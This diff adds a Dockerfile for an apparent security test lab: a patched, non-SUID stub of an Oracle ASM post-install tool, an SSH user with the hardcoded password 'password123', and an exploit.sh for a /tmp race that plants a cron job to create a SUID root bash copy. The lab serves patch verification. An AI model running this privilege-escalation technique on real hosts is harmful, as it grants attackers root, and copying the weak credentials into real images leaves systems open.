@@ -1,0 +1,76 @@
+FROM debian:bookworm-slim
+
+# Install required packages (identical to vulnerable version)
+RUN apt-get update && apt-get install -y \
+    openssh-server \
+    cron \
+    gcc \
+    libc6-dev \
+    passwd \
+    sed \
+    && rm -rf /var/lib/apt/lists/*
+
+# Setup SSH
+RUN mkdir -p /var/run/sshd && \
+    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# Create low-privilege user
+RUN useradd -m -s /bin/bash lowpriv && \
+    echo 'lowpriv:password123' | chpasswd
+
+# Fixed version: uses mktemp for secure temporary files instead of
+# predictable /tmp/crontab_edit paths. No SUID bit set.
+RUN cat <<'VULN_EOF' > /tmp/fixed_sasm_postinstall.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+/* Fixed version - uses secure temp files and no SUID */
+int main(int argc, char *argv[]) {
+    printf("Oracle Automated Service Manager 1.3.1 Post-Install (FIXED)\n");
+    printf("This version uses secure temporary files.\n");
+    printf("Must be run as root directly (no SUID).\n");
+    return 0;
+}
+VULN_EOF
+
+# Compile but do NOT set SUID - this is the fix
+RUN gcc -o /usr/local/bin/sasm-postinstall /tmp/fixed_sasm_postinstall.c && \
+    chown root:root /usr/local/bin/sasm-postinstall && \
+    chmod 0755 /usr/local/bin/sasm-postinstall && \
+    rm /tmp/fixed_sasm_postinstall.c
+
+# Keep the exploit script for testing (it should fail)
+RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
+#!/bin/bash
+echo "[*] Oracle ASM 1.3 /tmp race condition exploit"
+echo "[*] Pre-creating /tmp/crontab_edit with malicious crontab entry..."
+cat > /tmp/rootshell.sh << 'ROOTSH'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+ROOTSH
+chmod 755 /tmp/rootshell.sh
+cat > /tmp/crontab_edit << CRONTAB
+* * * * * /tmp/rootshell.sh
+CRONTAB
+echo "[*] Triggering sasm-postinstall..."
+/usr/local/bin/sasm-postinstall
+echo "[-] Binary is not SUID - exploit should fail"
+EXPLOIT_EOF
+
+RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
+    chmod 755 /home/lowpriv/exploit.sh
+
+# Verify the binary is NOT SUID
+RUN ls -la /usr/local/bin/sasm-postinstall && \
+    echo "Fixed sasm-postinstall binary installed WITHOUT SUID"
+
+RUN chmod 1777 /tmp
+
+EXPOSE 22
+CMD ["sh", "-c", "service cron start && /usr/sbin/sshd -D"]
